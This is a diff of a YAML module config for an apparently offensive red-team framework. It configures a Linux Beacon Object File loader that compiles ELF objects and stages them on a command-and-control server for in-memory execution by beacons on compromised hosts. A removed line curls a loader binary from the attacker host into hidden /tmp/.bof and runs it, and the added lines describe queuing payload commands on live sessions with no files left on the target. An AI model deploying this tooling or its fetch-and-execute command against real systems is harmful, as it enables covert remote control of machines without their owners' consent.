@@ -1,25 +1,31 @@
 name: blacksandbeacon_bof
-description: 'Linux BOF (Beacon Object File) loader for BlackSandBeacon. Compiles
-  and stages the BOF runtime loader, then delivers a position-independent ELF shared
-  object (.so) to an active BlackSandBeacon session.
+description: 'Linux BOF (Beacon Object File) loader for BlackSandBeacon. Compiles the
+  position-independent ELF objects and stages them where the C2 serves them, so a
+  live beacon can fetch and execute them in memory.
 
-  Linux BOF leverages direct syscalls and ELF dlopen injection — analogous to Windows
-  BOF but targeting Linux kernel internals via the /proc filesystem, io_uring, and
-  native assembly stubs. This brings the modular, in-memory extensibility of Windows
-  BOF to Linux engagements for the first time in an open-source framework.
+  Linux BOFs are plain ELF objects loaded by the beacon through the in-memory
+  RunELF loader with W^X trampolines and forced stack alignment — no dlopen, no
+  temp files, no loader binary on the target. Arguments travel through a datap
+  API mirroring the Windows BOF contract (BeaconDataParse, BeaconDataInt,
+  BeaconDataExtract) so existing BOF source ports with minimal changes.
 
-  Port a Windows BOF to Linux:
-    - Replace Win32 API calls with direct Linux syscalls or libc equivalents.
-    - Use the datap API (BeaconDataParse, BeaconDataInt, BeaconDataExtract) unchanged.
-    - Compile with: gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c
+  Compiled objects are served by the C2 at /download/bofs/<name> and delivered
+  with a `bof:<url>[ args]` command queued on the session (the beacon downloads
+  the object and calls go(args, alen)).
+
+  Write a new BOF:
+    - Export void go(char *args, int alen); include bof/include/beacon_api.h.
+    - Compile with: make bof-<name> (gcc -fPIC -nostdlib -m64).
 
   Usage:
-    blacksandbeacon_bof                  — compile bof_loader and stage it
-    blacksandbeacon_bof sessions/mybof.so — push a specific BOF to the session
+    blacksandbeacon_bof            — git pull + make bofs, stage build/bof/*.x64.o
+                                     to sessions/temp_uploads/bofs/
+    bof_catalog                    — list the staged BOF delivery catalog
+    bof_run whoami <beacon_id>     — queue a bof: command on a live session
 
   '
 author: LazyOwn RedTeam
-version: '1.0'
+version: '1.1'
 enabled: true
 update: true
 params:
@@ -30,7 +36,7 @@ params:
 - name: lport
   type: string
   required: true
-  description: C2 staging port where the bof_loader binary is served.
+  description: C2 staging port where the compiled BOFs are served.
 os: linux
 trigger: []
 tool:
@@ -38,9 +44,8 @@ tool:
   repo_url: https://github.com/grisuno/blacksandbeacon.git
   install_path: external/.exploit/blacksandbeacon
   install_command: make
-  execute_command: git restore . ; git pull ; make bof && cp bof_loader ../../../sessions/bof_loader
-    && echo "[blacksandbeacon_bof] BOF loader staged at sessions/bof_loader"
-  download_file: /tmp/.bof
-  lazycommand: curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod
-    +x /tmp/.bof && /tmp/.bof
+  execute_command: git restore . ; git pull ; make bofs && mkdir -p ../../../sessions/temp_uploads/bofs
+    && cp build/bof/*.x64.o ../../../sessions/temp_uploads/bofs/ && echo "[blacksandbeacon_bof]
+    BOFs staged at sessions/temp_uploads/bofs/"
+  lazycommand: bof_catalog
 category: 10. Command & Control
